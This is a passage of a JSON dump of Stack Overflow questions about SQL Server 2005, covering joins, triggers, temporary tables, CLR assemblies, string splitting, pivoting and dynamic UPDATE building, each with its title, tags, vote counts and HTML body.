</p>\n\n<p>I am attempting to first pull the Questions (from the table Questions_Bank_AnswerChoices) then match them up with the statistics (complex statement below).   The complex statement below pulls the statistics, but does not pull the questions unless they have been answered.  </p>\n\n<p>So, if no one answers question1, then question one will not show up in the statistics because it is not included in the Answers table (bc no one answered it).  </p>\n\n<p>How can I achieve this?  I think that I need to outer join?</p>\n\n<p>Complex Select Statement:</p>\n\n<pre><code>WITH tbl as (\n   SELECT \n      Questions_Bank.QuestionID, Questions_Bank.QuestionName,   \n      REPLACE(Schools_Answers_Items.AnswerValue, '? ', ', ') as AnswerValue, \n      COUNT(Schools_Answers_Items.SchoolsAnswersItemID) AS CountAnswer,\n      Schools_Answers_Items.SchoolID \n   FROM Questions_Bank \n   INNER JOIN Schools_Answers_Items\n     ON Questions_Bank.QuestionID = Schools_Answers_Items.QuestionID \n   LEFT OUTER JOIN Schools_Answers  \n     ON Schools_Answers_Items.SchoolsAnswerID = Schools_Answers.SchoolsAnswerID \n   WHERE (Questions_Bank.QuestionID = 1108) \n     AND (Schools_Answers.SchoolID = 103) \n   GROUP BY \n      Schools_Answers_Items.SchoolID,         \n      Schools_Answers_Items.AnswerValue,\n      Questions_Bank.QuestionID, \n      Questions_Bank.QuestionName\n) \nSELECT \n   QuestionID, QuestionName, AnswerValue, CountAnswer, \n   SUM(CountAnswer) OVER () AS CountAllAnswers  \nFROM tbl\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":10,"favorite_count":10,"up_vote_count":28,"down_vote_count":0,"view_count":131681,"score":28,"question_id":405288,"title":"SQL Server \"AFTER INSERT\" trigger doesn't see the just-inserted row","body":"<p>Consider this trigger:</p>\n\n<pre><code>ALTER TRIGGER myTrigger \n   ON someTable \n   AFTER INSERT\nAS BEGIN\n  DELETE FROM someTable\n         WHERE ISNUMERIC(someField) = 1\nEND\n</code></pre>\n\n<p>I've got a table, someTable, and I'm trying to prevent people from inserting bad records. For the purpose of this question, a bad record has a field \"someField\" that is all numeric.</p>\n\n<p>Of course, the right way to do this is NOT with a trigger, but I don't control the source code... just the SQL database. So I can't really prevent the insertion of the bad row, but I can delete it right away, which is good enough for my needs.</p>\n\n<p>The trigger works, with one problem... when it fires, it never seems to delete the just-inserted bad record... it deletes any OLD bad records, but it doesn't delete the just-inserted bad record. So there's often one bad record floating around that isn't deleted until somebody else comes along and does another INSERT.</p>\n\n<p>Is this a problem in my understanding of triggers? Are newly-inserted rows not yet committed while the trigger is running?</p>\n"},{"tags":["sql","sql-server-2005","oltp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":11992624,"title":"Concurrent Reads from Highly Transactional Table","body":"<p>Currently, I have a highly transactional database with appx 100,000 inserts daily.  Do I need to be concerned if I start allowing a large number of concurrent reads from my main transaction table?  I am not concerned about concurrency, so much as performance.</p>\n\n<p>At present there are 110+ million transactions in this table, and I am using SQL 2005</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","trace"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":11991187,"title":"Who was the last to modify a database object?","body":"<p><a href=\"http://izlooite.blogspot.com/2010/12/sql-server-how-to-find-user-who-last.html\" rel=\"nofollow\">This</a> article describes how to run a standard report to display recent DDL changes. </p>\n\n<p>If the data is captured, it's probably in a table somewhere. I would like to <code>Trace</code> this location so I can construct my own reports.</p>\n\n<p>Is this possible?</p>\n"},{"tags":["c#","sql-server-2005","datagrid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":4690723,"title":"assign value to datagridview cell at run time in c#","body":"<p>I have datagrid view in which I have 3 columns.  The are name, price, and quantity.  I have populated the first 2 columns from a dataset and now I want to assign a value to quantity the column based on the data in the existing columns.  How can I do that?</p>\n"},{"tags":["sql","sql-server-2005","implicit-conversion","query-plans"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":52,"score":5,"question_id":11989854,"title":"Analyising Implict CAST","body":"<p>I have an academic scenario, which I would like to know how to analyse.</p>\n\n<pre><code>DECLARE @date DATETIME\nSET     @date = getDate()\nSET     @date = DATEADD(DAY, DATEDIFF(DAY, 0, @date-3), 3)\n</code></pre>\n\n<p>This will round the date down to a Thursday.</p>\n\n<p>What I have been challenged on is to evidence where there are <em>implicit</em> CASTs.</p>\n\n<p>The are three places where I presume that this must be occuring...</p>\n\n<pre><code>DATEADD(\n  DAY,\n  DATEDIFF(\n    DAY,\n    0,          -- Implicitly CAST to a DATETIME?\n    @date-3     -- I presume the `3` is being implicitly cast to a DATETIME?\n  ),\n  3             -- Another implicit CAST to a DATETIME?\n)\n</code></pre>\n\n<p>Perhaps, however, as the <code>0</code> and <code>3</code>'s are are constants, this is done during compilation to an execution plan?</p>\n\n<p>But if the <code>3</code>'s were INT variables, would that be different?</p>\n\n<p><br/></p>\n\n<p>Is there a way to analyse an execution plan, or some other method, to be able to determine this imperically?</p>\n\n<p>To make matters more complicated, I'm currently off site.  I'm trying to remotely assist a colleague with this.  Which means I do not have direct access to SSMS, etc.</p>\n"},{"tags":["sql","database","sql-server-2005","connection","godaddy"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":8351,"score":7,"question_id":357147,"title":"Go Daddy SQL Server 2005 Remote Connection","body":"<p>Is it possible to connect to my remote database hosted at godaddy from locally from my PC?</p>\n\n<p>And if yes how?</p>\n\n<p>I tried the connection string provided to me but it didn't work.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":8535942,"title":"Calculating minutes within a defined time window?","body":"<p>I am looking to calculate the minutes spent performing a task that is within a specific time window. </p>\n\n<p>I have the two input parameters defining the time window <code>@WindowStart</code> and  <code>@WindowEnd</code> and i have [Task Start] and [Task End] columns in my task table. </p>\n\n<p>What would be the easiest way to calculate the time spent on a task that is within my time window? Tasks can easily begin or end after <code>@WindowStart</code> and <code>@WindowEnd</code>.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1215,"score":1,"question_id":3278860,"title":"Optional parameter in SQL server","body":"<p>I have a user defined function which is used in many stored procedures which will return me some value. If it possible for me to add a new optional parameter to the same.</p>\n\n<p>If I don't pass any value it should be null and if I pass some value it should take it. I don't want to go and change all the stored procedures to do so.</p>\n\n<p>Example code</p>\n\n<pre><code>dbo.CalculateAverageForUser(userid int)\n</code></pre>\n\n<p>Can I use <code>dbo.CalculateAverageForUser(userid int, type NVARCHAR(10) = NULL)</code></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":171,"score":1,"question_id":11986552,"title":"How to check correctly if a temporary table exists in SQL Server 2005?","body":"<p>I have a query where I insert some values from a table:</p>\n\n<pre><code>SELECT ID, NAME INTO #tmpTable1\nFROM TableOriginal\n</code></pre>\n\n<p>First execution is fine, if I press F5(Run) in MSSMS (Microsoft Sql Server Management Studio), the error occured:</p>\n\n<blockquote>\n  <p><em>Msg 2714, Level 16, State 6, Line 4<br>\n  There is already an object named '#tmpTable1' in the database.</em></p>\n</blockquote>\n\n<p>Good. I decided to check before insert data from <code>TableOriginal</code> to <code>#tmpTable1</code> using:</p>\n\n<pre><code>IF OBJECT_ID('tempdb.#tmpTable1') IS NOT NULL  \n  DROP TABLE #tmpTable1\n</code></pre>\n\n<p>Not working, the error shows again as above.</p>\n\n<p>I saw in <code>tempdb</code> database the following temporary table name:</p>\n\n<pre><code>dbo.#tmpTable1__________________0000007\n</code></pre>\n\n<p>Why? Every time when create a temporary table (using first query), the table name will be generated automatically in MSSMS ?</p>\n\n<p>How to remove the existing temporary table to do a new table with new values ?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","indexing","firebird2.5"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":139,"score":1,"question_id":11984636,"title":"How to decide when use index on table column","body":"<p>When should I use index on table?</p>\n\n<ol>\n<li>From how many rows index makes sense?</li>\n<li>If I have table with constant rows, just edited come columns (not in 'where' clause), makes index sense even if table has just about 15 rows? EDIT: Can be in such case non-index selecting/reading more effective than index read?</li>\n</ol>\n\n<p>EDIT:\nNow I am working with firebird 2.5, but most of the time I am using SQL Server 2005/2008. </p>\n"},{"tags":["sql-server-2005","linq-to-sql","stored-procedures","transactions"],"answer_count":2,"favorite_count":17,"up_vote_count":20,"down_vote_count":0,"view_count":8011,"score":20,"question_id":2073737,"title":"Nested stored procedures containing TRY CATCH ROLLBACK pattern?","body":"<p>I'm interested in the side effects and potential problems of the following pattern:</p>\n\n<pre><code>CREATE PROCEDURE [Name]\nAS\nBEGIN\n    BEGIN TRANSACTION\n    BEGIN TRY\n        [...Perform work, call nested procedures...]\n    END TRY\n    BEGIN CATCH\n        ROLLBACK TRANSACTION\n        RAISERROR [rethrow caught error using @ErrorNumber, @ErrorMessage, etc]\n    END CATCH\nEND\n</code></pre>\n\n<p>To the best of my understanding this pattern is sound when used with a single procedure - the procedure will either complete all of its statements without error, or it will rollback all actions and report the error.</p>\n\n<p>However when one stored procedure calls another stored procedure to do some sub-unit of work (with the understanding that the smaller procedure is sometimes called on its own) I see an issue coming about with relation to rollbacks - an informational message (Level 16) is issued stating <code>The ROLLBACK TRANSACTION request has no corresponding BEGIN TRANSACTION.</code>. This I assume is because the rollback in the sub-procedure is always rolling back the outer-most transaction, not just the transaction started in the sub-procedure.</p>\n\n<p>I do want the whole thing rolled back and aborted if any error occurs (and the error reported to the client as an SQL error), I'm just not sure of all the side effects that come from the outer layers trying to rollback a transaction that has already been rolled back. Perhaps a check of <code>@@TRANCOUNT</code> before doing a rollback at each TRY CATCH layer?</p>\n\n<p>Finally there is the client end (Linq2SQL), which has it's own transaction layer:</p>\n\n<pre><code>try\n{\n    var context = new MyDataContext();\n    using (var transaction = new TransactionScope())\n    {       \n            // Some Linq stuff\n        context.SubmitChanges();\n        context.MyStoredProcedure();\n        transactionComplete();\n    }\n}\ncatch\n{\n    // An error occured!\n}\n</code></pre>\n\n<p>In the event that a stored procedure, \"MySubProcedure\", called <em>inside</em> MyStoredProcedure raises an error, can I be sure that everything previously done in MyStoredProcedure will be rolled back, all the Linq operations made by SubmitChanges will be rolled back, and finally that the error will be logged? Or what do I need to change in my pattern to ensure the whole operation is atomic, while still allowing the child parts to be used individually (i.e. the sub-procedures should still have the same atomic protection)</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","backup","restore"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":785,"score":2,"question_id":3102273,"title":"simple & fast sql server database backup and restore","body":"<p>I'm looking for a simple (simplest if possible) way of backing up and restoring a database.</p>\n\n<p>I want to do a backup in one state and then after doing some operations get back to the backed up state. </p>\n\n<p>Tried Database->Tasks->Back Up... and then Database->Tasks->Restore but I always get an error with:</p>\n\n<p><code>Restore failed for...DBName</code></p>\n\n<p><code>The tail of the log for the database \"database name\" has not been backed up...</code></p>\n\n<p>So, I want to back up and restore with one simple operation each, can one advise me \nto a solution, be it GUI or not GUI based?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","resize"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":11970830,"title":"resize SQL Varchar","body":"<p>Is there a way to resize a local varchar in sql?</p>\n\n<p>like:</p>\n\n<pre><code>DECLARE @MYVARIABLE AS VARCHAR(3)\nREDIM @MYVARIABLE(50)\n</code></pre>\n\n<p>That will change the size of @MYVARIABLE to 50 char.</p>\n\n<p>Note: I need to keep the variable because I use it after.\nSo I cant use another one.</p>\n\n<p>Sample 2:</p>\n\n<pre><code>DECLARE @MYVARIABLE AS VARCHAR(4)\nSET @MYVARIABLE = 'TEST'\nSET @MYVARIABLE = '12345'\nSELECT @MYVARIABLE\n</code></pre>\n\n<p>here, MYVARIABLE = '1234' at the end. should be '12345'\nhow to do it (and keep myvariable)</p>\n\n<p>can I delete the current and create a new one?</p>\n"},{"tags":["java","sql-server-2008","tsql","sql-server-2005","teradata"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":11965633,"title":"Getting distinct values from Resultset","body":"<p>I have the following table Employee and records as follows:</p>\n\n<pre><code>Eid      Ename     Phone\n------------------------     \n 1         A        043\n 1         A        067\n 2         B        073\n 2         B        072\n 3         C        753 \n 3         C        464\n</code></pre>\n\n<p>What I've got so far:</p>\n\n<pre><code>SELECT *\nFROM   (SELECT Row_number() OVER (ORDER BY Eid ASC) AS rownum,\n               Eid,\n               Ename,\n               Phone\n        FROM   Employee\n        WHERE  Eid IN(SELECT DISTINCT(Eid)\n                      FROM   Employee\n                      GROUP  BY Eid)) AS RESULTSET\nWHERE  rownum BETWEEN 0 AND 3\n</code></pre>\n\n<p>Actually the inner query is returning the <code>distinct</code> results but it is not reflected when I am getting the result in final <code>RESULTSET</code>.</p>\n\n<p>Please advise on how to get the distinct RESULTSET. My output should return like below:</p>\n\n<pre><code>Eid      Ename     Phone\n------------------------     \n 1         A         043\n 2         B         073\n 3         C         753\n</code></pre>\n"},{"tags":["sql","sql-server-2005","pivot"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":242,"score":1,"question_id":2070183,"title":"How to convert data rows to columns?","body":"<p>I have a table tblUser , there is userId,firstName,LastName,Mobile,.......,QuestionID.\nAnother table it's name tblResults There is  questionID,Question,choiceID,choice,.........</p>\n\n<p>EG:</p>\n\n<pre><code>tblUser\n-----------------------------------------------------------------------------\nuserID -  FirstName- LstName -Mobile  ...     ...     ... -  QuestionID -  ChiceID\n-----------------------------------------------------------------------------\n001   -   xx     -     yy   -   03212          -                   01        01 \n001   -   xx     -     yy   -   03212          -                   02        02 \n002   -   xxx     -    yyy  -   03425         -                    01        02 \n002   -   xxx     -    yyy  -   03425        -                     02        01  \n003   -   xxxx    -    yyyy  -  03429         -                    03        02 \n003   -   xxxx   -     yyyy  -  03429          -                   03        01 \n------------------------------------------------------------------------------\n\ntblResults\n---------------------------------------------------------------------\nQuestionID   Question       ChoiceID       Chice    ....     ....            \n---------------------------------------------------------------------\n01        -    **Are you**   -  01   -   Male\n01        -    **Areyou**    -  02    -  Female\n02        -    **From**     -   01   -   xxxxx\n02        -    **FROM**     -   02    -  yyyyy  \n---------------------------------------------------------------------\n</code></pre>\n\n<p>I want to get result shown in following table</p>\n\n<pre><code>-------------------------------------------------------------------------------\nUserID FirstName LastName  Mobile  **Areyou**   **From**\n-------------------------------------------------------------------------------\n001    -   xx     -  yy     -   03212  -  Male  -  yyyyy\n002    -   xxx    -  yyy    -   03425   - Female - xxxxx\n003    -   xxxx   -  yyyy   -   03429  -  Female -  xxxxx        \n</code></pre>\n"},{"tags":["sql","json","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":214,"score":0,"question_id":11945458,"title":"TSQL parse JSON string to update table. Please check and advise any bugs","body":"<p>Thanks to Phil Factor's parseJSON function first. \"Consuming JSON Strings in SQL Server\"</p>\n\n<pre><code>http://www.simple-talk.com/sql/t-sql-programming/consuming-json-strings-in-sql-server/\n</code></pre>\n\n<p>I have a simple json data which submitted from web form</p>\n\n<p>e.g. <code>{\"FName\":\"sss\",\"MName\":\"ddd\",\"Surname\":\"test\",\"Mdob\":\"1976-08-11\",\"Mage\":\"\",\"Country\":\"AU\",\"Postcode\":\"5000\"}</code></p>\n\n<p>By using parseJSON function in the SQL query, I got recordset as below</p>\n\n<pre><code>SELECT  ROW_NUMBER() OVER(ORDER BY element_id) AS RowNum, [NAME], stringvalue FROM dbo.parseJSON('{\"FName\":\"sss\",\"MName\":\"ddd\",\"Surname\":\"test\",\"Mdob\":\"1976-08-11\",\"Mage\":\"\",\"Country\":\"AU\",\"Postcode\":\"5000\"}') WHERE valuetype='string'\n</code></pre>\n\n<p>RESULT:  <a href=\"http://i.stack.imgur.com/qm9UW.jpg\" rel=\"nofollow\">http://i.stack.imgur.com/qm9UW.jpg</a></p>\n\n<p>I also have a table named as 'tblMother' which have around 50 columns, the json data may contain different columns data each time depends on what user submitted.</p>\n\n<p>so in my store procedure I query COLUMN_NAME, DATA_TYPE, character_maximum_length from information_schema.columns, and then use nested loop to compare json NAME with table columns name to build UPDATE sql query.</p>\n\n<p>LOOP in TSQL: <a href=\"http://i.stack.imgur.com/sJUC2.jpg\" rel=\"nofollow\">http://i.stack.imgur.com/sJUC2.jpg</a></p>\n\n<p>There are two temp tables #tmp_JSON and #tmp_TABLEDETAILS which store info from JSON and COLUMN_NAME, DATA_TYPE</p>\n\n<p><strong>Just wondering is this the right way to build update query?</strong> </p>\n\n<p>Thanks</p>\n\n<p><em><strong>The Full Stored Procedure I wrote:</em></strong></p>\n\n<pre><code>CREATE PROCEDURE [dbo].[SaveJSON]  \n    @MID nvarchar(12),\n    @TableName nvarchar(25),\n    @JSONData nvarchar(MAX)\nAS\nBEGIN\n    SET NOCOUNT ON;\n\n    DECLARE @CountJSON int,\n            @CountTbl int,\n            @RowNumJSON int,\n            @RowNumTbl int,\n            @CharLen nvarchar(4),\n            @strSQL nvarchar(MAX),\n            @jCOLname nvarchar(30),\n            @jCOLval nvarchar(255),\n            @tCOLname nvarchar(30),\n            @tCOLtyp nvarchar(255)\n\n    SET @strSQL = 'UPDATE ' + @TableName + ' SET '\n\n    -- INSERT ALL INFO INTO TWO TEMP TABLE\n    SELECT ROW_NUMBER() OVER(ORDER BY element_id) AS RowNum, [NAME], stringvalue INTO #tmp_JSON FROM dbo.parseJSON(@JSONData) WHERE valuetype='string';\n    SELECT  ROW_NUMBER() OVER(ORDER BY ORDINAL_POSITION) AS RowNum, COLUMN_NAME AS ColName, DATA_TYPE, character_maximum_length AS CharLen INTO #tmp_TABLEDETAILS FROM information_schema.columns WHERE table_name=@TableName;\n\n    SELECT @CountJSON = count([NAME]) FROM #tmp_JSON;\n    SELECT @CountTbl = count(ColName) FROM #tmp_TABLEDETAILS;\n\n\n    SET @RowNumJSON = 0 \n    SET @RowNumTbl = 0 \n\n    -- TWO NESTED LOOP TO BUILD UPDATE SQL STRING \n    WHILE @RowNumJSON &lt; @CountJSON\n    BEGIN\n        SET @RowNumJSON = @RowNumJSON + 1       \n        SET @RowNumTbl = 0\n\n        SELECT @jCOLname = [NAME], @jCOLval = stringvalue FROM #tmp_JSON WHERE RowNum = @RowNumJSON;\n\n\n            WHILE @RowNumTbl &lt; @CountTbl\n            BEGIN\n                SET @RowNumTbl = @RowNumTbl + 1\n\n                SELECT @tCOLname = ColName, @tCOLtyp = DATA_TYPE, @CharLen = CAST(CharLen AS nvarchar(4)) FROM #tmp_TABLEDETAILS WHERE RowNum = @RowNumTbl;\n\n                IF @jCOLname = @tCOLname AND NOT @CharLen IS NULL\n                BEGIN\n                    IF @jCOLval = ''\n                        SET @strSQL = @strSQL + @jCOLname + '=NULL, '\n                    ELSE\n                        SET @strSQL = @strSQL + @jCOLname + '=''' + @jCOLval + ''', '\n                END\n                IF @jCOLname = @tCOLname AND @CharLen IS NULL AND @tCOLtyp &lt;&gt; 'datetime'\n                    SET @strSQL = @strSQL + @jCOLname + '=' + @jCOLval + ', '\n                IF @jCOLname = @tCOLname AND @tCOLtyp = 'datetime'\n                    SET @strSQL = @strSQL + @jCOLname + '=CONVERT(DATETIME,''' + @jCOLval + ''', 102), '    \n            END\n\n    END\n\n    DROP TABLE #tmp_JSON\n    DROP TABLE #tmp_TABLEDETAILS\n\n    SET @strSQL = LEFT(@strSQL, LEN(@strSQL)-1)\n    SET @strSQL = @strSQL + ' WHERE MotherID = ''' + @MID + ''';'\n\n    PRINT @strSQL\n\nEND\n</code></pre>\n\n<p><strong>EXEC by</strong> </p>\n\n<pre><code>exec DBO.SaveJSON '10000000','tblMother','{\"FName\":\"sss\",\"MName\":\"ddd\",\"Surname\":\"test\",\"Mdob\":\"1976-08-11\",\"Mage\":\"\",\"Country\":\"AU\",\"Postcode\":\"5000\"}'\n</code></pre>\n\n<p><strong>Return @strSQL string is</strong> </p>\n\n<pre><code>UPDATE tblMother SET FName='sss', MName='ddd', Surname='test', Mdob=CONVERT(DATETIME,'1976-08-11', 102), Mage=NULL, Country='AU', Postcode=5000 WHERE MotherID = '10000000';\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11977673,"title":"SQL Assembly Errors with Unsafe","body":"<p>I have the following error message:</p>\n\n<pre><code>Msg 10314, Level 16, State 11, Line 1\nAn error occurred in the Microsoft .NET Framework while trying to load assembly id 66007. The server may be running out of resources, or the assembly may not be trusted with PERMISSION_SET = EXTERNAL_ACCESS or UNSAFE. Run the query again, or check documentation to see how to solve the assembly trust issues. For more information about this error: \nSystem.IO.FileLoadException: Could not load file or assembly 'powerstatregression, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047)\nSystem.IO.FileLoadException: \n    at System.Reflection.Assembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, Assembly locationHint, StackCrawlMark&amp; stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection)\n    at System.Reflection.Assembly.InternalLoad(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n    at System.Reflection.Assembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n    at System.Reflection.Assembly.Load(String assemblyString)\n</code></pre>\n\n<p>I run this code and the last lines cause the problem:</p>\n\n<pre><code>ALTER DATABASE dasolPSDev SET TRUSTWORTHY ON;\nGO\n\nCREATE ASSEMBLY PowerStatRegression\nAUTHORIZATION [dbo]\nfrom 'C:\\SqlDlls\\PowerStatRegression.dll'\nWITH PERMISSION_SET = UNSAFE\nGO\n\nCREATE PROCEDURE [dbo].[SpCreatePowerStatCorr]\n    @strUID [nvarchar](4000),\n    @seqId [int],\n    @flagProgress [int]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[SpCreatePowerStatCorr]\nGO\n\nCREATE PROCEDURE [dbo].[SpCreatePowerStatCorrEx]\n    @strUID [nvarchar](4000),\n    @seqId [int],\n    @flagProgress [int]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[SpCreatePowerStatCorrEx]\nGO\n\n\nCREATE PROCEDURE [dbo].SpCheckCollinearity\n    @strUID [nvarchar](4000),\n    @seqId [int],\n    @flagProgress [int]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[SpCheckCollinearity]\nGO\n\n\nCREATE PROCEDURE [dbo].[AboutPowerStatCorrelation]\nWITH EXECUTE AS CALLER\nAS\nEXTERNAL NAME [PowerStatRegression].[StoredProcedures].[AboutPowerStatCorrelation]\nGO\n\n--  To Test\ndbo.AboutPowerStatCorrelation\nGO\n\ngrant execute on SpCreatePowerStatCorr to db_executor\nGO\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":106,"score":2,"question_id":11972350,"title":"Crosstab multi columns","body":"<p>Hello I have a problem with SQL in SQL Server 2005.</p>\n\n<p>Suppose that I have a table called myTable with data as below:</p>\n\n<pre><code>|   NAME | CREDIT | GRADE | YEAR | SEMESTER |\n---------------------------------------------\n|  Name1 |      1 |     A |    1 |        1 |\n|  Name2 |      4 |     B |    1 |        1 |\n|  Name3 |      2 |     E |    1 |        1 |\n|  Name4 |      7 |     F |    1 |        1 |\n|  Name5 |      4 |     A |    1 |        2 |\n|  Name6 |      3 |     C |    1 |        2 |\n|  Name7 |      6 |     D |    1 |        2 |\n|  Name8 |      1 |     A |    1 |        2 |\n|  Name9 |      1 |     A |    1 |        2 |\n| Name10 |      1 |     A |    1 |        2 |\n| Name11 |      3 |     C |    2 |        1 |\n| Name12 |      6 |     E |    2 |        1 |\n| Name13 |      4 |     C |    2 |        1 |\n| Name14 |      2 |     B |    2 |        2 |\n| Name15 |      1 |     A |    2 |        2 |\n| Name16 |      1 |     A |    2 |        2 |\n| Name17 |      1 |     A |    2 |        2 |\n| Name18 |      5 |     D |    3 |        1 |\n| Name19 |      1 |     A |    3 |        1 |\n| Name20 |      1 |     A |    3 |        1 |\n| Name18 |      5 |     D |    3 |        2 |\n| Name19 |      1 |     A |    3 |        2 |\n| Name20 |      1 |     A |    3 |        2 |\n</code></pre>\n\n<p>I want to output the result as below:</p>\n\n<pre><code>|  NAM1 | CRDT1 | GRD1 | YEAR1 | SEMER1 | NAM2 | CRDT2 | GRD2 | YEAR2 | SEMES2 |\n   -----------------------------------------------------------------------------\n|  Name1|     1 |    A |     1 |      1 |Name5 |     4 |    A |     1 |      2 |\n|  Name2|     4 |    B |     1 |      1 |Name6 |     3 |    C |     1 |      2 |\n|  Name3|     2 |    E |     1 |      1 |Name7 |     6 |    D |     1 |      2 |\n|  Name4|     7 |    F |     1 |      1 |Name8 |     1 |    A |     1 |      2 |\n                                        |Name9 |     1 |    A |     1 |      2 |\n                                        |Name10|     1 |    A |     1 |      2 |\n| Name11|    3 |     C |     2 |      1 |Name14|     2 |    B |     2 |      2 |\n| Name12|    6 |     E |     2 |      1 |Name15|     1 |    A |     2 |      2 |\n| Name13|    4 |     C |     2 |      1 |Name16|     1 |    A |     2 |      2 |\n                                        |Name17|     1 |    A |     2 |      2 | \n| Name18|    5 |     D |     3 |      1 |Name18|     5 |    D |     3 |      2 |\n| Name19|    1 |     A |     3 |      1 |Name19|     1 |    A |     3 |      2 |\n| Name20|    1 |     A |     3 |      1 |Name20|     1 |    A |     3 |      2 |   \n</code></pre>\n\n<p>Where </p>\n\n<pre><code>- Nam1= Name in Semester 1\n- CRDT1= Credit in Semester 1\n- GRD1= Grade in Semester 1\n- Year1= Year in Semester 1 \n- Semer1 = Semester in Semester 1\n\n- Nam2= Name in Semester 2\n- CRDT2= Credit in Semester 2\n- GRD2= Grade in Semester 2\n- Year2= Year in Semester 2 \n- Semer2 = Semester in Semester 2\n</code></pre>\n\n<p>Please go to this URL to test this SQL: <a href=\"http://sqlfiddle.com/#!3/196c6/1\" rel=\"nofollow\">http://sqlfiddle.com/#!3/196c6/1</a> <br /><br />\nHow Can I create SQL to make output like this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":9332,"score":6,"question_id":951401,"title":"SQL 2005 Split Comma Separated Column on Delimiter","body":"<p>My google searches on how to split a string on a delimiter have resulted in some useful functions for splitting strings when the string is known (i.e. see below):</p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nALTER FUNCTION [dbo].[Split] (@String varchar(8000), @Delimiter char(1))     \n   returns @temptable TABLE (items varchar(8000))       \n   as       \n   begin       \n       declare @idx int       \n        declare @slice varchar(8000)       \n\n        select @idx = 1       \n            if len(@String)&lt;1 or @String is null  return       \n\n       while @idx!= 0       \n       begin       \n           set @idx = charindex(@Delimiter,@String)       \n           if @idx!=0       \n               set @slice = left(@String,@idx - 1)       \n           else       \n              set @slice = @String       \n\n           if(len(@slice)&gt;0)  \n               insert into @temptable(Items) values(@slice)       \n\n           set @String = right(@String,len(@String) - @idx)       \n           if len(@String) = 0 break       \n       end   \n   return       \n   end\n</code></pre>\n\n<p>This works well for a known string like:</p>\n\n<pre><code>SELECT TOP 10 * FROM dbo.Split('This,Is,My,List',',')\n</code></pre>\n\n<p>However, I would like to pass a column to a function, and have it unioned together with my other data in it's own row... for example given the data:</p>\n\n<pre><code>CommaColumn   ValueColumn1   ValueColumn2\n-----------   ------------   -------------\nABC,123       1              2\nXYZ, 789      2              3\n</code></pre>\n\n<p>I would like to write something like:</p>\n\n<pre><code>SELECT Split(CommaColumn,',') As SplitValue, ValueColumn1, ValueColumn2 FROM MyTable\n</code></pre>\n\n<p>And get back</p>\n\n<pre><code>SplitValue    ValueColumn1   ValueColumn2\n----------    ------------   ------------\nABC           1              2\n123           1              2\nXYZ           2              3\n789           2              3\n</code></pre>\n\n<p>Is this possible, or has anyone done this before?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":11975063,"title":"Add Catalog to an Existing Linked Server","body":"<p>I have an existing Linked Server with a few catalogs... how can I add another, existing database/catalog to this linked server?</p>\n\n<p>For Example, my object explorer looks like this:</p>\n\n<p>Linked Servers</p>\n\n<ul>\n<li>Providers</li>\n<li>DB4\\PRODUCTION</li>\n<li>DB4_LINK\n<ul>\n<li>Catalogs\n<ul>\n<li>System Catalogs</li>\n<li>MyDatabase</li>\n<li>MyOtherDatabase</li>\n</ul></li>\n</ul></li>\n</ul>\n\n<p>How can I add yet another database that already exists to DB4_LINK?</p>\n\n<p>EDIT: I'm trying to add an <em>existing</em> database to this linked server entry.</p>\n"},{"tags":["sql","string","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11974290,"title":"Dynamic String replacement in a list for SQL 2005","body":"<p>I have a column that can have results like the 